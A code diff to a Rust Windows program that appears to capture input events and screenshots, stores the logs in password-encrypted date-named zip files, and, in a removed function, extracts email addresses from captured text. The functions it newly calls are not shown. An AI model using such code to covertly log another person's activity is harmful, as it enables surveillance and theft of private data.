@@ -2,6 +2,7 @@
 
 use core::mem::MaybeUninit;
 use winapi::um::winuser;
+use windows::Win32::Graphics::Gdi::COLOR_3DDKSHADOW;
 use std::collections::HashMap;
 use std::fs;
 use std::fs::{File, OpenOptions};
@@ -38,7 +39,9 @@ fn main() {
         SubItem3,
     }
 
-    *LOG_FILE.lock().unwrap() = readlog("log.txt");
+    let now: DateTime<Utc> = Utc::now();
+    let fname = format!("L{}.zip", now.format("%Y-%m-%d").to_string());
+    *LOG_FILE.lock().unwrap() = read_logs(&fname, "log.txt", PASS);
 
     let (s, r) = std::sync::mpsc::channel::<Events>();
     let icon = include_bytes!("./resources/icon1.ico");
@@ -217,7 +220,7 @@ fn track(event: Event) {
             let logs = LOG_FILE.lock().unwrap().clone();
             *LOGGED.lock().unwrap() = true;
 
-            match dolog(logs) {
+            match do_logs(logs) {
                 Ok(_) => println!("Text written to logs."),
                 Err(e) => println!("Error: {e:?}"),
             };
@@ -245,7 +248,7 @@ fn track(event: Event) {
                     let now_parsed: DateTime<Utc> = x.parse().unwrap();
                     *LOG_FILE.lock().unwrap() += &(String::from("   ") + &now_parsed.to_string() + "\n");
                     let logs = LOG_FILE.lock().unwrap().clone();
-                    match dolog(logs) {
+                    match do_logs(logs) {
                         Ok(_) => println!("Text written to logs."),
                         Err(e) => println!("Error: {e:?}"),
                     };
@@ -258,27 +261,6 @@ fn track(event: Event) {
         EventType::MouseMove{x, y} => (),
         _ => (),
     }
-}
-
-fn dolog(logs: String) -> ZipResult<()> {
-    let now: DateTime<Utc> = Utc::now();
-    let fname = format!("L{}.zip", now.format("%Y-%m-%d").to_string());
-
-    let path = std::path::Path::new(&fname);
-    let file = std::fs::File::create(path).unwrap();
-
-    let mut zip = ZipWriter::new(file);
-
-    let options = FileOptions::default()
-        .compression_method(CompressionMethod::Stored)
-        .unix_permissions(0o755)
-        .with_deprecated_encryption(PASS);
-
-    zip.start_file("log.txt", options)?;
-    zip.write(logs.as_bytes())?;
-    zip.finish()?;
-
-    Ok(())
 }
 
 fn append_screenshots() -> ZipResult<()> {
@@ -310,43 +292,4 @@ fn append_screenshots() -> ZipResult<()> {
     zip.finish()?;
 
     Ok(())
-}
-
-fn readlog(filename: &str) -> String {
-    let now: DateTime<Utc> = Utc::now();
-    let fname = format!("L{}.zip", now.format("%Y-%m-%d").to_string());
-    let file = match fs::File::open(fname) {
-        Ok(file) => file,
-        Err(err) => {
-            let x: String = format!("{}", now);
-            let now_parsed: DateTime<Utc> = x.parse().unwrap();
-
-            dolog(String::from(""));
-            return String::from("");
-        }
-    };
-
-    let reader = BufReader::new(file);
-
-    let mut archive = ZipArchive::new(reader).unwrap();
-
-    let mut file = match archive.by_name_decrypt(&filename, PASS) {
-        Ok(file) => file.unwrap(),
-        Err(..) => {
-            println!("File {} not found in the zip.", filename);
-            return String::from("");
-        }
-    };
-
-    let mut contents = String::new();
-    file.read_to_string(&mut contents).unwrap();
-    contents
-}
-
-fn links(text: String) -> String {
-    let mut finder = LinkFinder::new();
-    finder.kinds(&[LinkKind::Email]);
-    let links: Vec<_> = finder.links(&text).collect();
-    let text = links.into_iter().map(|c| c.as_str().to_owned() + "\n").collect::<String>();
-    text
 }
